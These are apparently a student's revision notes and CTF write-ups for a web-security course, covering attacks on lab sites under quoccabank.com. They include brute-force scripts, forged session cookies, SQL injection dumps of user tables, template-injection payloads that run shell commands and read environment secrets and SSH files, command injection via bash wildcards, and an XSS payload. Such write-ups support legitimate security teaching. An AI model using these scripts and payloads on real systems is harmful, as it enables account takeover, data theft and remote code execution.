# Revision Notes / Challenges Write-ups

## Blog
### Recon
#### COMP6443{ivefinallyfoundsomeone}
1. Check `robots.txt`.

### IDOR
#### COMP6443{hiddenpostflag}
#### COMP6443{restructuringisonthecards}
#### COMP6443{strongpasswordsaregreat}
1. Click on *Scott* post.
2. Pay attention to the url `https://blog.quoccabank.com/?p=42`.
3. Give the parameter *b* some random values, e.g. : `https://blog.quoccabank.com/?p=67`. This will redirect to a search page. 
4. Search for keywords like *admin*, *flag*, *COMP6443*.

### Security misconfigurations
#### COMP6443{strongpasswordsaregreat}
1. Go to the *COMP6443{hiddenpostflag}* page, click the hyperlink, *your dashboard*. This redirects to a login page. 
2. Login as username: *admin* and password: *admin*. 

#### COMP6443{Ifoundsarah}
1. Login as username: *sarah* and password: *quocca*. 

### IDOR + Security misconfigurations
#### COMP6443{Ialsofoundtimmy}
1. Pay attention to the url of the *admin* page: `https://blog.quoccabank.com/?author=1`.
2. Brute-force the value of the parameter, *author* and notice the page title.
3. For `https://blog.quoccabank.com/?author=5`, the page title tells that the *author id* belongs to the administrator. 
4. Brute-force the password with username: *administrator*. 
   - Burp Suite Intruder
   - Script

```python
import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

fp = open('words.txt')
words = fp.readlines()
for word in words:
    word = word.strip()
    data = {}
    data["log"] = "administrator"
    data["pwd"] = word
    print(f"Trying password: {word}")
    # allow_redirects set to False so that it won't redirect to the next page and return the wrong status code
    r = requests.post(f"https://blog.quoccabank.com/wp-login.php", allow_redirects=False, proxies=proxies, verify=False, data=data)
    print(r.status_code)
    # Will only redirect (status code = 302) when success
    if r.status_code == 302:
        print(f"SUCCESS password: {word}")
        break
    else:
        continue
```

## Files
### Information exposure
#### COMP6443{St@ff_OnLY_Bey0nd_7hiS_P01n7_z5346077_WZMW+THBCeV5VjdcOlln}
1. Register as a new user, username: *user* and password: *user*. 
2. Check the JS file, *app.d4309454.js*. The file leaks information about website paths. There's a staff path. 
```Javascript
 var W = new f["a"]({
    routes: [{
        path: "/",
        name: "home",
        component: P,
        meta: {
            middleware: N
        }
    }, {
        path: "/login",
        name: "login",
        component: x
    }, {
        path: "/staff/wfh",
        name: "wfh",
        component: L
    }]
});
```
3. Go to `https://files.quoccabank.com/#/staff/wfh`. It gives a path to access staff work from home page: `/covid19/supersecret/lmao/grant_staff_access?username=adam`. 
4. Change the value of the parameter *username* to the registered username: *user*: `https://files.quoccabank.com/covid19/supersecret/lmao/grant_staff_access?username=user`.
5. The staff *staff_super_secret_file* and *staff_flask_secret_key* are leaked in the homepage.

### Cookie poisoning
#### COMP6443{L00k_@_me_I_am_Th3_ADm1n_N0w_v2_z5346077_z+jaODGxuhK1c82YY0//}
#### COMP6443{I_Luv_Id0R_z5346077_TD2lfzVFaJXYYHGHXvdI}
1. Check the cookie of the file website. 
2. Decode the cookie with flask session decoder gives *{"role":"User","username":"user"}*.
3. Escalate the privilege by manipulating the data: *{"role": "Admin", "username": "admin"}*. 
4. Encode the data with the *staff_flask_secret_key*.
5. Alter the website cookie and refresh the page.
6. The user is now logged in as admin and can view flags in the admin account. 

### IDOR
#### COMP6443{I_Luv_Id0R_z5346077_TD2lfzVFaJXYYHGHXvdI}
1. Open a file and pay attention to the url, e.g. `https://files.quoccabank.com/document/nothing_to_see_here?r=YWRtaW4=`. 
2. The url consists of `https://files.quoccabank.com/document/<filename>?r=<base64(role)>`. 
3. Try to access flag file through the url: `https://files.quoccabank.com/document/flag?r=YWRtaW4=`, where filename: *flag* and role: *admin*. 

### Security misconfigurations
#### Warning! COMP6443{BrUt3_f0rCE_B35t_f0rCE_z5346077_W2/7Nnfofp+rYHib5Cg5}
1. Recon - check `robots.txt`. It leaks the disallowed path: `/admin`.
2. Go to the `https://files.quoccabank.com/admin`. 
3. Brute-force the 4-digit access code.
```python
import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

for d1 in range(0, 10):
    for d2 in range(0, 10):
        for d3 in range(0, 10):
            for d4 in range(0, 10):
                pin = str(d1) + str(d2) + str(d3) + str(d4)
                data = {}
                data["pin"] = pin
                print(f"Trying pin: {pin}")
                r = requests.post(f"https://files.quoccabank.com/admin", allow_redirects=False, proxies=proxies, verify=False, data=data)
                if r.status_code == 302 or "COMP" in r.text:
                    f = open("flags.txt", "w")
                    f.write(r.text)
                    break
            else:
                continue
            break
        else:
            continue
        break
    else:
        continue
    break

```

## Notes
### Cookie poisoning
#### COMP6443{IT_D0ESn7_eVen_V3r1Fy}
1. Check cookie. The cookie is jwt encoded.
2. Decode the cookie with jwt decoder.
3. Manipulate the payload by setting the username to *admin* and increasing the expiry date: *{"Username": "admin@quoccabank.com", "exp": 1782924959}*. 

## Sales
### Cookie poisoning
#### COMP6443{WhY_Ev3n_H4vE_A_l0g1n}
1. Check cookie. The cookies is base64+url encoded. 
2. Decode the cookie, it gives *admin=0*. 
3. Escalate to the admin privilege by manipulating the data to *admin=1*, then base64+url encode.
4. Refresh the page and the user is logged in as admin.

## Support
### IDOR
#### COMP6443{DDDDDDDDr0P_D@_Ba5e}
#### COMP6443{YoU_r3lLy_Wen7_D1ggiNG_HuH}
1. Create a new ticket. IT redirects to a page to view ticket. 
2. Pay attention to the url of the page: `https://support.quoccabank.com/raw/7EG6Xov`, where *7EG6Xov* is encoded in base58.
3. Decode it gives *751:1*, means *user:ticket*.
4. Brute-force the pair, base58 encode and get request.
```python
import requests
import base58
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

for user in range(1, 10000):
    for ticket in range(1, 10000):
        print(f"Trying {user}:{ticket}")
        r = requests.get(f"https://support.quoccabank.com/raw/{base58.b58encode(str(user) +':'+ str(ticket)).decode('utf-8')}", proxies=proxies, verify=False)
        if ("COMP" in r.text):
            f = open("flags.txt", "a")
            f.write(r.text)
            break
    else:
        continue
    break
```

## Payportal
### SQLi
#### COMP6443{SQLiIsPowerful}
1. Search `"` tells the SQL syntax.
2. Search `" or 1=1; -- test`.
#### COMP6443{oh_no_im_getting_fired}
1. Search `" or 1=1 union select 1,1,1,1,1,1,1,table_name from information_schema.tables; -- test` to get all tables in the schema.
2. This leaks tables name: *payportal*, *upcoming_layoffs*. 
3. To view columns in *upcoming_layoffs*, search `" or 1=1 union select 1,1,1,1,1,1,1,column_name from information_schema.columns where table_name='upcoming_layoffs'; -- test`.
4. The *upcoming_layoffs* table contains id, staff_id, date, reason columns.
5. To view *upcoming_layoffs*, search " or 1=1 union select 1,1,1,1, id, staff_id, date, reason from upcoming_layoffs -- test`.

## Bigapp
### Cookie poisoning
#### COMP6443{I_Th0uGHT_We_F1xeD_Th15_L@st_W3Ek_z5346077_SZITLDoaQA73OGXuy1gi}
1. Sign up an account and log in, e.g. email: *user@user.com* and password: *12345678*. 
2. Inspect the cookie. The cookie is in base64 encoded format.
3. Decode the cookie, the format of the decoded string is `<user_email>:<role>`. 
4. The user can escalate their account to admin privilege by manipulating the *role* in the cookie, e.g. `user@user.com:admin`. 
5. Base64 encode and update the cookie.
6. Refresh the page and the user now has admin privilege.

### SQLi
#### COMP6443{Il1_h@v3_2_nuMBeR_9s..._z5346077_SOmuU/qealL79vqXXwz4}
#### COMP6443{I_@lwayS_Want_M0rE_Than_YoU_G1Ve_z5346077_vQWznAFTgBwR4jCrEIQA}
#### COMP6443{Wh0_R3memBERs_P@ssWorDS_Th3se_dAYz_z5346077_HbTydbp4SkAidFUQB3tJ}
#### COMP6443{What_I5nt_Inj3ct@ble_z5346077_0suSiDC1n6Pi983r3N8B}
1. Search `'`. In Burp Suite, it tells that the request encoutered an internal server error (status code = 500). This means that `'` is the SQL syntax.
2. Search `' or 1=1; -- test`. The request still encountered the same error. 
3. Try adding `)` to the SQLi payload, e.g.`') or 1=1; -- test`. 
4. Search `')) or 1=1; -- test`. This gives all banking products, meaning that the payload is correct. 
5. Try order the list by searching `')) order by id -- test`.
6. To view all tables in the schema, search `')) or 1=1 union select 1,1,1,1,1,table_name from information_schema.tables; -- test`. 
7.  This leaks the other table in the schema: *users*. 
8. On the login page, login as username: `' or 1=1 -- test` and a random password: *12345678*. 
9.  The user is logged in as *Rae.Salley@miller.com*. 
10. The flag can be found in the response header. 
11. Since the login page is vulnerable to SQLi, the page to create new users is more likely to have SQLi vulnerability as well (same configuration). 
12. Try to create duplicated user, *John Smith*. 
13. Create a new user with name *John Smith* and email: *John@quoccabank.com*. 
14. In Burp Suite, send the request to the Repeater. Insert `John%40quoccabank.com' or 1=1 -- ` as the *email* payload.

### SQLi + Security misncofigurations
#### COMP6443{I_@m_th3_Adm1n_AgaIN_z5346077_Rr+GqbZkVr3uoWPe9eEu}
1. To view the columns in the *users* table, search `')) or 1=1 union select 1,1,1,1,1,column_name from information_schema.columns where table_name="users"; -- test`. 
2. This leaks the columns in the *users* table: id, fname, lname, userid, email, mobile, city, state, postcode, password.
3.. To view *users* table, search `')) or 1=1 union select userid,fname,lname,mobile,email,password from users; -- test`. 
4. This leaks all users' information, including email and hased password. 
14. The website admin has email: *admin@quoccabank.com* and password: *Admin@123* (use online MD5 decryption tool to decrypt the hashed password).
5. The user is signed in as admin.

## Secrets
### SQLi
#### COMP6443{WAIT_THERES_SQLI_THAT_ISNT_JUST_OR_1=1_???_z5346077_bOiYam1Lg0SDG7dB0Jig}
#### COMP6443{HUH_SQL_THAT_ISNT_INJECTION_z5346077_v8zQtbXV1aQ7uMqieN0h}
1. Check `robots.txt` to view disallowed paths: `/admin/dashboard`, `/source`.
2. Go to `/admin/dashboard`. Register a new user, e.g. username: *user*, password: *user*, secret: *user*. 
3. Check source code that is available in `/source`. 
4. There are two flags: **update empty string as the secret** and **get admin's secret**. The vulnerabilities are in the *add_user* and *update_secret* functions. 
```python
def get_secret(username):
    try:
        secret = curs.execute('SELECT secret FROM secrets WHERE username = %s', (username,)).fetchone()
        if secret == None:
            return 'user does not exist'
        elif secret[0] == '':
            return 'COMP6443{SECRETS-1_FLAG_HERE}'
        else:
            return secret[0]
    except:
        return 'database error detected'
```
```sql
DROP TABLE IF EXISTS secrets;
CREATE TABLE secrets (
    uid INTEGER NOT NULL PRIMARY KEY AUTO_INCREMENT,
    username char(64),
    password char(64),
    secret text
);
```
5. Update secret with SQLi payload, `" WHERE USERNAME='USER1' -- TEST`. 
6. The database name and password as *char(n)*. This data type stores data in length *n*, so the data is padded with spaces. 
7. Register a new account as admin by using username: *admin* with a tailing whitespace, and a random password: *admin*. 
8. The user now has admin privilege. 

### RCE
#### COMP6443{THAT_REALLY_INJECTED_MY_TEMPLATES_z5346077_9nO6gNPhG+b+cTIa4SN1}
1. The user can now access admin page. Since it tells to specify the user, the user can specify the username in the url: `https://secrets.quoccabank.com/admin?username=user1`. 
2. Inspect the response header. The website uses *gunicorn* which uses gunicorn, Python and bootstrap. Therefore, it is more likely to use Jinja template engine and is vulnerable to Server-side template injection (SSTI). 
3. Create a new account with random username and password, e.g. username: *user2* and password: *user*. Insert `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}` as the secret payload. 
4. `ls` lists the directory: *app.py*, *flag*, *requirements.txt* and *src*. 
5. Log into the admin account and access the `/admin` page with username: *user2*, e.g. `https://secrets.quoccabank.com/admin?username=user2`.
6. Log in back to the user2 account and update the secret with `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}`. 
7. Repeat step 5.
```python
import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

s = requests.Session()
s.proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
s.verify = False
s.headers.update({
    "Cookie": "eyJ1c2VybmFtZSI6InVzZXIyIn0.ZFC2aQ.BsZAct3LquXvcVCTmahoB9iTOBg"
})

while True: 
    r = s.post("https://secrets.quoccabank.com/update", json={"secret": f"{input()}"})
```

### SSRF
#### 
1. Log into the *user2* account and update secret with `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls src').read() }}`.
2. Log in back to the admin account to view the contents in `src`.
3. Repeat step 1 with secret payload, `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat src/views.py').read() }}`.
4. Log in back to the admin account to view the contents in `src/views.py`.
5. Repeat step 1 with secret payload, `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls /home').read() }}` and view the contents. 
6. Repeat step 1 with secret payload, `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls /home/melon').read() }}` and view the contents. 
7. Repeat step 1 with secret payload, `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -a /home/melon').read() }}` to view all filesincluding hidden files, e.g. *.ssh*.
8. Repeat step 1 with secret payload, `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -a /home/melon/.ssh').read() }}` to view all hidden files in *.ssh*. 
9. The admin endpoint shows a *known_hosts* file within *.ssh*.
10. Repeat step 1 with secret payload, `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat -a /home/melon/.ssh/known_hosts').read() }}` to view contents. 
11. The admin endpoint shows the existence of a host, `crombridge-analytical.quoccabank.com` 
which is not accessible by external servers but is likely accessible by the host server.
12. Repeat step 1 with secret payload, `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat/proc/self/environ').read() }}` to view the environment variable: *SUPER_SECURE_SECRET_PASSWORD=OUR_ACCESS_CONTROL_IS_SECOND_TO_NONE*. 
13. Repeat step 1 with secret payload, `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl crombridge-analytical.quoccabank.com?password=OUR_ACCESS_CONTROL_IS_SECOND_TO_NONE'').read() }}` to make a curl request to *crombridge-analytical.quoccabank.com with the password found in the environment. 
14. View the content on the admin account.

## Letters
### SSRF
#### COMP6443{IWonderWhatThatDebugOptionIsFor}
1. View the source page by clicking *Secret Sauce*. 
2. The body of the letter is specified by user input, which is rendered within a LaTex template, so this is vulnerable to LaTex injection. 
3. To access the */flag*, insert `\input{/flag}` as the content of the letter. 

## Lookup 
### SSRF
#### COMP6443{NOT_ALL_DATABASES_ARE_SQL_z5346077_eFyevw8xLl9OlzV809L6}
1. Since all alphanumeric characters are stripped, we have to use bash wild cards. 
2. To `cat /flag`, find the binary file for `cat`. Lookup `/???/???/???` for `/usr/bin/cat` or `/???/???` for `/bin/cat`.
3. The binary file is `/bin/cat`. 
4. Lookup `; /???/??? /????` for `/bin/cat /flag`. 
<br>

## Webcms4
### SQLi 
1. Log in with username: `' or 1=1 -- test` and a random password: *password*. 
2. The user is logged in as Jack Smith. 
3. Search for `' or 1=1 -- test` and it returns all results. This tells that `'` is the sql syntax. 
4. Search `' or 1=1 union select 1,1,1,tbl_name from sqlite_schema; -- test` to view the tables in the schema. 
5. This leaks tables: *assignments*, *courses* and *users*. 
6. To view columns in the *users* table, search `' or 1=1 union select 1,1,1,name from pragma_table_info("users"); -- test`. 
7. This leaks all columns of the *users* table: *bio*, *image*, *name*, *password* and *sid*. 
8. To view sensitive information of all users, search `' or 1=1 union select sid, name, password, bio from "users" -- test`. 
9. This leaks all user information, including *Admin*. 
10. The user can logged in as the admin with username: *admin* and password: *cat*. 
11. To view all columns in the *assignents* table, search `' or 1=1 union select 1,1,1,name from pragma_table_info("assignments"); -- test`.
12. It leaks all columns of the *assignments* table: *id*, *name* and *spec*. 
13. To view the *assignments* table, search `' or 1=1 union select 1,id,name,spec from assignments; -- test`. 
14. It tells the target domain of *assignment1*: `assignment1.25b3582f3953bd7e.quoccabank.com`. 

### XSS
1. XSS can be injected to the website when editing the profile. 
2. Inject the XSS payload, `<script>alert(1)</script>` to the bio. 

### CSRF
1. The user can place malicious url in the profile pic field when editing the profile. 

### SSRF
1. Check submission??

## Legit Auth Page
### Recon
#### COMP6443{N0_mOr3_BI0G_SiTE_ChAlS_PLZ}
1. Go to `notwordpress.quoccabank.com`. 
2. View the source page. 



## Tips/Notes
- Recon is always the first step
  - Check `robots.txt`
- Check cookie 
  - Base64
  - JWT
  - Flask session
  - Hashes
- Check url 
  - If allow IDOR attacks
- SQLi
  - See if vulnerable to SQLi by entering special entities: '";<>--
  - Always start with `or 1=1; -- test`
  - Try `where` to get information
  - Can try `order by`
  - View tables: `union select table_name from information_schema.tables; -- test`
  - *UNION*: need to have consistent columns so the sql statement should select enough columns (add 1).
  - View columns: `union select column_name from information_schema.columns where table_name='<table_name>'; -- test`
- RCE/file traversal
  - `cat flag` - reads file and prints on the stdout
  - `/etc/passwd`
  - `/proc/self/environ`
  - 
- XSS 
  - if no report - most likely not gonna be XSS
- JSONP
  - callback script in the source page

## Useful resources/tools
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [SQLi](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)
- [CSP Cheat Sheet](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy)
- [XSS Scripts Gadgets](https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf)
- [jwt.io](https://jwt.io/)
- [CyberChef](https://gchq.github.io/CyberChef/)
- [Hash Crack](https://crackstation.net/)
- Flask session encode/decode
  - `python3 flask_session_cookie_manager3.py decode -c <string> -s <secret>`
  - `python3 flask_session_cookie_manager3.py encode -t <string> -s <secret>`

## Final
- Identified possible vulnerable points in the website
- Identified the vulnerability and described how an attack might play out PLUS some understanding of how to remediate the vulnerability
- Attempted and got partial exploitation of the vulnerability, with some description or example payloads that can be replicated.
- Got a payload that worked or should have worked if not for a typo or network errors

